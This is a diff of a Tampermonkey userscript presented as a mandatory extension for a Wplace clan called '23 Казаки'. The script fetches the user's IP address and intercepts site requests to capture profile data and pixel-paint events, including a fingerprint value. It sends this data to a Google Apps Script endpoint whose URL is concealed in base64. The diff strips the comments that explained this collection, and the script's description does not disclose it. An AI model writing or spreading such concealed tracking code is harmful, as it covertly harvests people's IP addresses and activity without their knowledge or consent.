@@ -3,7 +3,7 @@
 // @namespace    http://tampermonkey.net/
 // @version      1.0
 // @description  Обязательное расширение для Wplace-клана "23 Казаки". Посторонним вход ВОСПРЕЩЁН!
-// @author       You
+// @author       KirOFF
 // @match        https://*.wplace.live/*
 // @match        http://*.wplace.live/*
 // @icon         https://www.google.com/s2/favicons?sz=64&domain=wplace.live
@@ -20,10 +20,9 @@
 
     const _0x4a21 = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J3VkcybVA3dUpjS1lXeDRNN195d0U1NVBKVVB1UEtLc2VGWERHNEh2V2pQSkNob0RsbVFxY0hHblZ0OGI5bnk2SmwvZXhlYw==";
 
-    // --- КОНФИГУРАЦИЯ ---
     const CONFIG = {
-        scriptUrl: atob(_0x4a21), // ЗАМЕНИ НА СВОЙ URL
-        targetAllianceId: "671209", // ВПИШИ ID НУЖНОГО КЛАНА
+        scriptUrl: atob(_0x4a21),
+        targetAllianceId: "671209",
         debug: true
     };
 
@@ -33,7 +32,6 @@
         isMonitoring: false
     };
 
-    // 1. Получение IP адреса
     GM_xmlhttpRequest({
         method: "GET",
         url: "https://api64.ipify.org?format=json",
@@ -62,12 +60,10 @@
                 const response = await originalFetch(...args);
                 const url = args[0] instanceof Request ? args[0].url : args[0];
 
-                // А) Ловим данные профиля
                 if (url.includes('backend.wplace.live/me')) {
                     this.handleMe(response.clone());
                 }
 
-                // Б) Ловим факт закраски (POST запрос без параметров ?)
                 if (url.match(/pixel\/\d+\/\d+$/) && !url.includes('?')) {
                     this.handlePaint(args, response.clone());
                 }
@@ -81,7 +77,6 @@
             const d = await resp.json();
             State.myInfo = d;
 
-            // Проверка на принадлежность к клану
             if (String(d.allianceId) === CONFIG.targetAllianceId) {
                 Helpers.sendToSheet({
                     type: 'user',
@@ -108,14 +103,13 @@
                 const coords = payload.coords || [];
                 const fp = payload.fp || 'n/a';
 
-                const batch = []; // Сюда собираем все данные
+                const batch = [];
 
                 for (let i = 0; i < coords.length; i += 2) {
                     const x = coords[i];
                     const y = coords[i + 1];
                     const color = colors[i / 2];
 
-                    // Задержка всё еще нужна, чтобы сервер сайта успел обновить владельца
                     await Helpers.sleep(1200);
 
                     const pixelUrl = `https://backend.wplace.live/s0/pixel/23/23?x=${x}&y=${y}`;
@@ -135,7 +129,6 @@
                     });
                 }
 
-                // Отправляем ВЕСЬ массив одним махом
                 if (batch.length > 0) {
                     Helpers.sendToSheet(batch);
                 }
